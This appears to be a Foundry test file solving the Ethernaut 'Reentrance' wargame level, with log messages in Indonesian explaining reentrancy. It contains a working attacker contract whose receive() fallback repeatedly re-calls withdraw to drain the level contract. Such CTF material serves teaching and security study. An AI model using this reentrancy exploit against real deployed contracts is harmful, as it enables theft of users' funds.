// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "../Ethernaut.sol";
import "../11-Reentrance/ReentranceFactory.sol";
import "forge-std/Test.sol";

contract ReentraceAttack is Test {
    function testReentrance() external {
        vm.createSelectFork(vm.envString("sepolia"));
        address jack = makeAddr("jack");
        vm.deal(jack, 100 ether);
        Ethernaut ethernaut = new Ethernaut();
        ReentranceFactory factory = new ReentranceFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(jack, jack);
        address addr = ethernaut.createLevelInstance{value: 1 ether}(factory);
        Reentrance reentrance = Reentrance(payable(addr));
        bool adaAset = address(reentrance).balance != 0;
        assertTrue(adaAset);
        emit log("setup done!\nGoal: menguras aset pada kontrak");
        emit log(
            "Reentrancy adalah bug yang memungkinkan penyerang memanggil fungsi berkali-kali sebelum kontrak memodifikasi perubahan"
        );
        emit log("deploy contract attacker");
        DoubleEnter hack = new DoubleEnter{value: 2 ether}(addr);
        hack.attack();
        emit log("submit");
        bool sukses = ethernaut.submitLevelInstance(payable(addr));
        assertTrue(sukses);
    }
}

contract DoubleEnter {
    Reentrance reentrance;

    constructor(address a) payable {
        reentrance = Reentrance(payable(a));
    }

    function attack() external {
        reentrance.donate{value: 2 ether}(address(this));
        reentrance.withdraw(1 ether);
    }

    receive() external payable {
        reentrance.withdraw(1 ether);
    }
}
